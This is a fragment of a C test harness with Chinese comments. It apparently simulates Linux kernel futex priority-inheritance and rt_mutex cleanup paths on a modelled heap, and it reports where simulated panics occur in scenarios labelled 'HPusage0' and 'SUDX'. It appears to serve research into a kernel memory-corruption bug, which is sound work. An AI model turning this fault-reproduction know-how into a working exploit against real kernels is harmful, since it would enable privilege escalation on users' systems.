        seed_heap(120, 0, 0, 0);
        setup_pass(0, &cfgHP);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s) ← usage=0 [12] put 到 0\n",
                                  (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出（不应发生）\n");
        dump_heap("heap after HPusage0");
    } else if (!strcmp(sc, "SUDX")) {
        /* v6 复现 + 进程退出清理（futex_cleanup → cleanup_proxy_lock → remove_waiter） */
        zero_page_reset();
        setup_pass(0, &cfgS); run_flpi();
        setup_pass(1, &cfgU); run_flpi();
        setup_pass(2, &cfgD); run_flpi();
        printf("\n== 进程退出：M0/M1/M2 futex_cleanup → rt_mutex_cleanup_proxy_lock ==\n");
        for (int i = 0; i < 3 && !fault_pending; i++) {
            g_cur_task = TASK_M(i);
            printf("--- cleanup pass %d (M%d) ---\n", i, i);
            rt_mutex_cleanup_proxy_lock(FUTEX_LOCK(i), M_STACK(i) + MWAITER_OFF);
        }
        if (fault_pending) printf("★ 退出清理 PANIC @ %016llx (%s)\n",
                                  (unsigned long long)fault_addr, fault_where);
        else printf("★ 退出清理全部干净\n");
        dump_z("Z after exit cleanup");
    } else {
        printf("unknown scenario %s\n", sc);
        return 1;
    }

    printf("=== %s done ===\n", sc);
    return 0;
}
